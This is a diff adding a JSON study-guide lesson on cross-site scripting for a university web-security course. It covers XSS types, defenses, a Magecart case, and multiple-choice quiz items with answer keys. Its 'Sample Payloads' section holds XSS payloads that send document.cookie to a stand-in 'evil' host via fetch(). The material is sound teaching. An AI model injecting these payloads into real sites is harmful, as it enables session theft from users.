@@ -1,0 +1,159 @@
+{
+  "nodeId": "l11-web-security-2-1-cross-site-scripting-xss",
+  "locale": "th",
+  "title": "1. Cross-Site Scripting (XSS)",
+  "objective": "Study-guide review — ICCS423 v2 — L11: Web Security 2 (XSS · CSRF · Files · SSRF · API · Proactive Controls): 1. Cross-Site Scripting (XSS).",
+  "blocks": [
+    {
+      "kind": "heading",
+      "text": "What XSS Is"
+    },
+    {
+      "kind": "list",
+      "items": [
+        "Attacker injects malicious JavaScript into a page that the victim's browser executes in the trusted context of the target site",
+        "Impact: session theft, keylogging, redirect to phishing, defacement, drive-by malware"
+      ]
+    },
+    {
+      "kind": "paragraph",
+      "text": "XSS is \"injection into the browser\" — converts the user-site trust relationship into attacker control."
+    },
+    {
+      "kind": "heading",
+      "text": "Three Types"
+    },
+    {
+      "kind": "table",
+      "headers": [
+        "Type",
+        "Source",
+        "Persists?",
+        "Who is hit"
+      ],
+      "rows": [
+        [
+          "Reflected",
+          "URL/form param echoed back",
+          "No",
+          "Anyone clicking a crafted link"
+        ],
+        [
+          "Stored",
+          "Database (comments, profiles)",
+          "Yes",
+          "Every visitor of the page"
+        ],
+        [
+          "DOM-based",
+          "Client-side JS reads from URL fragment / postMessage",
+          "Usually no",
+          "Crafted-link clickers; server never sees payload"
+        ]
+      ]
+    },
+    {
+      "kind": "heading",
+      "text": "Sample Payloads"
+    },
+    {
+      "kind": "paragraph",
+      "text": "```html <!-- Reflected --> ?q=<script>fetch('https://evil/'+document.cookie)</script>"
+    },
+    {
+      "kind": "paragraph",
+      "text": "<!-- Stored (no <script> needed) --> <img src=x onerror=\"fetch('https://evil/?c='+document.cookie)\"> <svg onload=\"alert(document.domain)\"> ```"
+    },
+    {
+      "kind": "heading",
+      "text": "Defenses (in order)"
+    },
+    {
+      "kind": "list",
+      "items": [
+        "Context-aware output encoding — HTML body, attributes, JS string, URL, CSS each need different encoding",
+        "Content Security Policy (CSP) — script-src 'self' 'nonce-xyz'; object-src 'none'; base-uri 'self'",
+        "HttpOnly cookies — limits damage even if XSS lands",
+        "Use safe APIs — textContent over innerHTML; React JSX auto-escapes (avoid the dangerous-set-inner-HTML escape hatch)",
+        "Sanitization library for user-supplied HTML — DOMPurify (client) / Bleach (Python)"
+      ],
+      "ordered": true
+    },
+    {
+      "kind": "paragraph",
+      "text": "``python # HTML context — Jinja escapes by default from markupsafe import escape return f\"<p>Hello {escape(name)}</p>\" ``"
+    },
+    {
+      "kind": "paragraph",
+      "text": "Real-world: British Airways (2018) — Magecart script injection on payment page → 500K cards → £20M GDPR fine. Subresource Integrity (SRI) + strict CSP would have blocked the skimmer."
+    }
+  ],
+  "attribution": "Course: ICCS423 | Source: Thoth Library + RAG | Target: 3rd-4th year CS | Date: 2026-05-03",
+  "cheatsheet": [
+    "Reflected: URL/form param echoed back",
+    "Stored: Database (comments, profiles)",
+    "DOM-based: Client-side JS reads from URL fragment / postMessage",
+    "Context-aware output encoding: HTML body, attributes, JS string, URL, CSS each need different encoding",
+    "Content Security Policy (CSP): script-src 'self' 'nonce-xyz'; object-src 'none'; base-uri 'self'",
+    "HttpOnly cookies: limits damage even if XSS lands",
+    "Use safe APIs: textContent over innerHTML; React JSX auto-escapes (avoid the dangerous-set-inner-HTML escape hatch)"
+  ],
+  "checkpoint": [
+    {
+      "id": "q1",
+      "prompt": "In the study guide for L11 Web Security 2, \"Reflected\" is described as:",
+      "choices": {
+        "A": "URL/form param echoed back",
+        "B": "Database (comments, profiles)",
+        "C": "limits damage even if XSS lands",
+        "D": "Client-side JS reads from URL fragment / postMessage"
+      },
+      "correct": [
+        "A"
+      ],
+      "explanation": "The study guide states: Reflected: URL/form param echoed back"
+    },
+    {
+      "id": "q2",
+      "prompt": "In the study guide for L11 Web Security 2, \"Stored\" is described as:",
+      "choices": {
+        "A": "limits damage even if XSS lands",
+        "B": "URL/form param echoed back",
+        "C": "Database (comments, profiles)",
+        "D": "Client-side JS reads from URL fragment / postMessage"
+      },
+      "correct": [
+        "C"
+      ],
+      "explanation": "The study guide states: Stored: Database (comments, profiles)"
+    },
+    {
+      "id": "q3",
+      "prompt": "In the study guide for L11 Web Security 2, \"DOM-based\" is described as:",
+      "choices": {
+        "A": "limits damage even if XSS lands",
+        "B": "HTML body, attributes, JS string, URL, CSS each need different encoding",
+        "C": "script-src 'self' 'nonce-xyz'; object-src 'none'; base-uri 'self'",
+        "D": "Client-side JS reads from URL fragment / postMessage"
+      },
+      "correct": [
+        "D"
+      ],
+      "explanation": "The study guide states: DOM-based: Client-side JS reads from URL fragment / postMessage"
+    },
+    {
+      "id": "q4",
+      "prompt": "In the study guide for L11 Web Security 2, \"Context-aware output encoding\" is described as:",
+      "choices": {
+        "A": "script-src 'self' 'nonce-xyz'; object-src 'none'; base-uri 'self'",
+        "B": "Client-side JS reads from URL fragment / postMessage",
+        "C": "HTML body, attributes, JS string, URL, CSS each need different encoding",
+        "D": "textContent over innerHTML; React JSX auto-escapes (avoid the dangerous-set-inner-HTML escape hatch)"
+      },
+      "correct": [
+        "C"
+      ],
+      "explanation": "The study guide states: Context-aware output encoding — HTML body, attributes, JS string, URL, CSS each need different encoding"
+    }
+  ]
+}
